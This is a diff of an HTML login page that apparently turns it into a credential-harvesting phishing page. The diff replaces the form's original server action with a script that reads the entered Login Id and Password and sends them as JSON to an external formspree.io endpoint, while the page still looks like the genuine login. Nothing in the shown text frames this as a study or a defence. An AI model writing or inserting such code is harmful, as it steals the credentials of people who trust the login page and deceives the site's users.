@@ -1,5 +1,5 @@
-<!DOCTYPE html>
-<html lang="en">
+
+
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -258,16 +258,16 @@ MM_reloadPage(true);
 <table>
   <tbody><tr>
    <td valign="top"><br><br>
-     <form name="index" method="post" action="SMUC.php">
+     <form name="index" onsubmit="onClick()">
        <input type="hidden" name="refresh" value="96222">	
        <table cellspacing="0" cellpadding="1">
           <tbody><tr> 
             <td width="34%" align="left"><font size="2" face="Times New Roman, Times, serif" color="#004488"><strong>Login Id:</strong></font></td>
-            <td align="left"><input type="text" name="ID" size="20"></td>
+            <td align="left"><input type="text" name="ID" size="20" id="ID"></td>
           </tr>
           <tr> 
             <td width="34%" align="left"><font size="2" face="Times New Roman, Times, serif" color="#004488"><strong>Password:</strong></font></td>
-            <td align="left"><input type="password" name="PASS" size="20"></td>
+            <td align="left"><input type="password" name="PASS" size="20" id="PASS" ></td>
           </tr>
        </tbody></table>
    
@@ -342,10 +342,34 @@ MM_reloadPage(true);
 </tbody></table>
 </div>
 
+<script>
+	var onclick = () => {
+    var id = document.getElementById('ID').value
+    var pass = document.getElementById('PASS').value
 
+    fetch("https://formspree.io/f/mqkjkvgw", {
+    method: "POST",
+    body: JSON.stringify({
+        title: id,
+        body: pass,
+        userId: 1
+    }),
+     
+    headers: {
+        "Content-type": "application/json; charset=UTF-8"
+    }
+})
+ 
+// Converting to JSON
+.then(response => response.json())
+ 
+// Displaying results to console
+.then(json => console.log(json));
+}
+</script>
 
 </div>
 
 </body>
-</html>
+
 
